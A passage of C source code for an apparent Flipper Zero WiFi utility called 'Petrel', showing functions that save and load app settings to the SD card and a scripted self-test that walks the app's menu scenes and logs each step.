// --- E4: app settings, persisted to /ext/petrel/settings.txt ---------------------
// (globals live up top so scenes/helpers defined earlier can use them)
static void petrel_settings_save(void) {
    // The directory has to exist before the worker runs - it does not create directories - and
    // mkdir is cheap and idempotent, so it stays here. The write itself goes to the storage
    // worker: this is called from the settings list's change callbacks on the GUI thread, and it
    // used to write the card synchronously on every key press.
    Storage* st = furi_record_open(RECORD_STORAGE);
    storage_common_mkdir(st, "/ext/petrel");
    furi_record_close(RECORD_STORAGE);

    char buf[128];
    int n = snprintf(
        buf,
        sizeof(buf),
        "channel=%s\nscan_wait=%d\nvibro=%d\nsave=%d\n",
        set_channels[set_channel_idx],
        set_scan_wait,
        set_vibro ? 1 : 0,
        set_save ? 1 : 0);
    char* snap = malloc((size_t)n);
    if(snap) {
        memcpy(snap, buf, (size_t)n);
        if(!storage_submit("/ext/petrel/settings.txt", snap, (size_t)n, false)) free(snap);
    }
}

static void petrel_settings_load(void) {
    Storage* st = furi_record_open(RECORD_STORAGE);
    File* f = storage_file_alloc(st);
    if(storage_file_open(f, "/ext/petrel/settings.txt", FSAM_READ, FSOM_OPEN_EXISTING)) {
        char buf[256];
        size_t n = storage_file_read(f, buf, sizeof(buf) - 1);
        buf[n] = '\0';
        storage_file_close(f);
        char* _sv = NULL;
        char* line = petrel_strtok(buf, "\n", &_sv);
        while(line) {
            if(!strncmp(line, "channel=", 8)) {
                int v = atoi(line + 8);
                for(int i = 0; i < SET_CHANNELS_N; i++)
                    if(atoi(set_channels[i]) == v) set_channel_idx = i;
            } else if(!strncmp(line, "scan_wait=", 10)) {
                int v = atoi(line + 10);
                set_scan_wait = (v < 5 || v > 30) ? 12 : v;
            } else if(!strncmp(line, "vibro=", 6)) {
                set_vibro = atoi(line + 6) != 0;
            } else if(!strncmp(line, "save=", 5)) {
                set_save = atoi(line + 5) != 0;
            }
            line = petrel_strtok(NULL, "\n", &_sv);
        }
    }
    storage_file_free(f);
    furi_record_close(RECORD_STORAGE);
}

// --- In-app self-test (architect D.5) ---------------------------------------------------------
// A scripted navigation loop driven by the GUI tick. It uses the PRODUCTION hub callback
// (wifi_hub_cb) and scene_manager_previous_scene, and never calls a scene's on_enter() to fake a
// transition, so what it exercises is the production path. The first version drove the hub with
// scene_manager_handle_custom_event(), which the hub IGNORES - wifi_hub_scene_on_event() returns
// false for every event - and that is why the first run sat on the hub scene for all 29 steps. Each
// step is breadcrumbed with diag() together with the ACTUAL current scene, so a crash or a stuck
// step leaves the exact place - and it needs no external RPC at all, which is what makes the
// "app alone" measurement possible.
#define ST_LAPS 3
#define ST_STEPS 10
static uint8_t st_lap = 0;
static uint8_t st_step = 0;
static uint32_t st_due = 0;
static volatile bool st_active = false;

static void selftest_step(Petrel* app) {
    // Let the production scan completion path return before taking another action. If it never
    // does (board silent, link dead), abort the self-test instead of freezing the app: the old
    // unconditional return left the UI unresponsive with no way back.
    if(app->scan_waiting) {
        static uint32_t wait_since = 0;
        uint32_t nowt = furi_get_tick();
        if(!wait_since) wait_since = nowt;
        if((int32_t)(nowt - wait_since) > (int32_t)furi_ms_to_ticks(20000)) {
            wait_since = 0;
            app->scan_waiting = false;
            st_active = false;
            diag(19, 99u, 1u);   // self-test failure: scan completion never arrived
            view_dispatcher_stop(app->view_dispatcher);
        }
        return;
    }
    (void)0;

    // Finish on a later tick, after any scan started by the final step has completed.
    if(st_lap >= ST_LAPS) {
        st_active = false;
        diag(9, (uint32_t)st_lap, diag_dropped);
        view_dispatcher_stop(app->view_dispatcher);
        return;
    }

    uint32_t scene = scene_manager_get_current_scene(app->scene_manager);
    bool root_below = scene_manager_has_previous_scene(app->scene_manager, mainMenuScene);

    // A non-root scene must retain the root below it. A root must not be duplicated.
    if((scene == mainMenuScene && root_below) || (scene != mainMenuScene && !root_below)) {
        st_active = false;
        diag(19, scene, 1u);   // self-test failure: root invariant
        view_dispatcher_stop(app->view_dispatcher);
        return;
    }

    diag(8, (uint32_t)st_step, (uint32_t)st_lap);
    diag(10, scene, root_below ? 1u : 0u);   // actual scene BEFORE action

    switch(scene) {
    case mainMenuScene:
        scene_manager_next_scene(app->scene_manager, wifiHubScene);
        break;
    case wifiHubScene:
        // Production submenu callback IDs, not the custom-event enum.
        // 2026-10-29: do NOT start a scan here. Driving the scan scene from this tick wedged the
        // GUI thread (scan_waiting then blocked the very step that would have popped the scene,
        // and the app stopped answering keys). The scan is covered by the manual flow; the
        // self-test now walks List Wifi / Channel Map instead.
        wifi_hub_cb(app, (st_lap & 1) == 0 ? 1u : 2u);
        break;
    default:
        // root_below was checked BEFORE attempting the pop.
        if(!scene_manager_previous_scene(app->scene_manager)) {
            st_active = false;
            diag(19, scene, 2u);   // self-test failure: unexpected empty stack
            view_dispatcher_stop(app->view_dispatcher);
            return;
        }
        break;
    }

    st_step++;
    if(st_step >= ST_STEPS) {
        st_step = 0;
        st_lap++;
    }
}

